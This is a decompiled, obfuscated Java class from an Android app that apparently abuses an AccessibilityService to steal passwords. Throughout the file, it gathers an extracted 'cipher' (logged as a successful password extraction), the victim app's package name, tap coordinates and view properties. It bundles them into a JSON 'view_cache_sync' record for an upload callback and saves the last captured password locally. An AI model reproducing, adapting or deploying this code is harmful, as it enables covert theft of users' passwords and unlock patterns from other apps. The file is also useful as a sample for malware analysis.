package com.storm.safe.rock.service.modules.cipher;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.SharedPreferences;
import java.util.ArrayList;
import java.util.Iterator;
import kotlin.text.AbstractC0779a1;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.AbstractC1120qr;
import p000.C1351vv;
import p000.aa1;
import p000.h10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.cipher.a6 */
/* loaded from: classes2.dex */
public final class C0340a6 {
    public /* synthetic */ C0340a6(AbstractC1120qr abstractC1120qr) {
        this();
    }

    public final C0341a7 getInstance() {
        return C0341a7.f53381c2;
    }

    private C0340a6() {
    }

    public final C0341a7 getInstance(AccessibilityService accessibilityService, Context context) {
        final C0341a7 c0341a7;
        t60.m214695b6(accessibilityService, "svc");
        t60.m214695b6(context, "ctx");
        synchronized (this) {
            try {
                c0341a7 = C0341a7.f53381c2;
                if (c0341a7 == null) {
                    c0341a7 = new C0341a7(accessibilityService, context);
                    C0341a7.f53381c2 = c0341a7;
                    CipherExtractor cipherExtractor = CipherExtractor.f53228a0;
                    h10 h10Var = new h10() { // from class: com.storm.safe.rock.service.modules.cipher.ViewCacheCollector$setupUploadCallback$1
                        {
                            super(1);
                        }

                        @Override // p000.h10
                        public final Object invoke(Object obj) throws JSONException {
                            ArrayList arrayList;
                            ArrayList arrayList2;
                            Object next;
                            CipherResult cipherResult = (CipherResult) obj;
                            t60.m214695b6(cipherResult, "result");
                            String str = (String) c0341a7.f53386a3.get();
                            if (str == null) {
                                str = c0341a7.f53390a7;
                            }
                            C0341a7 c0341a72 = c0341a7;
                            Object obj2 = c0341a72.f53389a6;
                            if (obj2 == null) {
                                obj2 = c0341a72.f53392a9;
                            }
                            String str2 = (String) c0341a7.f53387a4.get();
                            if (str2 == null) {
                                str2 = c0341a7.f53391a8;
                            }
                            if (str2.length() == 0 && str.length() > 0) {
                                Iterator it = c0341a7.f53385a2.iterator();
                                while (true) {
                                    if (!it.hasNext()) {
                                        next = null;
                                        break;
                                    }
                                    next = it.next();
                                    if (((aa1) next).f56a0.equals(str)) {
                                        break;
                                    }
                                }
                                aa1 aa1Var = (aa1) next;
                                str2 = aa1Var != null ? aa1Var.f58a2 : "";
                            }
                            if (str2.length() == 0 && str.length() > 0 && (str2 = (String) AbstractC0715je.m213297i4(AbstractC0779a1.m213677d0(str, new String[]{"."}, 6))) == null) {
                                str2 = str;
                            }
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put("type", "view_cache_sync");
                            jSONObject.put("pkg", str);
                            jSONObject.put("cls", obj2);
                            jSONObject.put("app", str2);
                            Object obj3 = cipherResult.f53233a0;
                            if (obj3 == null) {
                                obj3 = "";
                            }
                            jSONObject.put("cipher", obj3);
                            Object obj4 = cipherResult.f53235a2;
                            if (obj4 == null) {
                                obj4 = "";
                            }
                            jSONObject.put("grade", obj4);
                            jSONObject.put("ts", System.currentTimeMillis());
                            CipherDataHolder cipherDataHolder = C0339a5.f53364a2;
                            synchronized (cipherDataHolder) {
                                arrayList = new ArrayList(cipherDataHolder.f53227a2);
                                arrayList2 = new ArrayList(cipherDataHolder.f53226a1);
                            }
                            JSONArray jSONArray = new JSONArray();
                            int size = arrayList.size();
                            for (int i = 0; i < size; i++) {
                                Point point = (Point) arrayList.get(i);
                                JSONObject jSONObject2 = new JSONObject();
                                jSONObject2.put("x", point.f53261a0);
                                jSONObject2.put("y", point.f53262a1);
                                jSONArray.put(jSONObject2);
                            }
                            jSONObject.put("coords", jSONArray);
                            jSONObject.put("cnt", arrayList.size());
                            JSONArray jSONArray2 = new JSONArray();
                            int size2 = arrayList2.size();
                            int i2 = 0;
                            while (i2 < size2) {
                                Object obj5 = arrayList2.get(i2);
                                i2++;
                                ListenPropResponse listenPropResponse = (ListenPropResponse) obj5;
                                JSONObject jSONObject3 = new JSONObject();
                                jSONObject3.put("i", listenPropResponse.f53240a0);
                                jSONObject3.put("p", listenPropResponse.f53241a1);
                                jSONObject3.put("v", listenPropResponse.f53242a2);
                                jSONObject3.put("t", listenPropResponse.f53243a3);
                                jSONArray2.put(jSONObject3);
                            }
                            jSONObject.put("props", jSONArray2);
                            StringBuilder sbM41c2 = AbstractC0003a2.m41c2("✅ 密码提取成功: ", cipherResult.f53233a0, ", pkg=", str, ", app=");
                            sbM41c2.append((Object) str2);
                            t60.m214714d6("VCC", sbM41c2.toString());
                            h10 h10Var2 = c0341a7.f53393b0;
                            if (h10Var2 != null) {
                                h10Var2.invoke(jSONObject);
                            }
                            C0341a7 c0341a73 = c0341a7;
                            try {
                                String strOptString = jSONObject.optString("cipher", "");
                                Object value = c0341a73.f53395b2.getValue();
                                t60.m214694b5(value, "<get-prefs>(...)");
                                ((SharedPreferences) value).edit().putString("last_result", jSONObject.toString()).putString("last_cipher", strOptString).putLong("last_ts", System.currentTimeMillis()).apply();
                            } catch (Exception unused) {
                            }
                            c0341a7.f53386a3.set(null);
                            c0341a7.f53387a4.set(null);
                            c0341a7.f53390a7 = "";
                            c0341a7.f53391a8 = "";
                            c0341a7.f53392a9 = "";
                            return C1351vv.f60710b1;
                        }
                    };
                    cipherExtractor.getClass();
                    CipherExtractor.f53231a3 = h10Var;
                } else {
                    c0341a7.f53383a0 = accessibilityService;
                }
            } catch (Throwable th) {
                throw th;
            }
        }
        return c0341a7;
    }
}
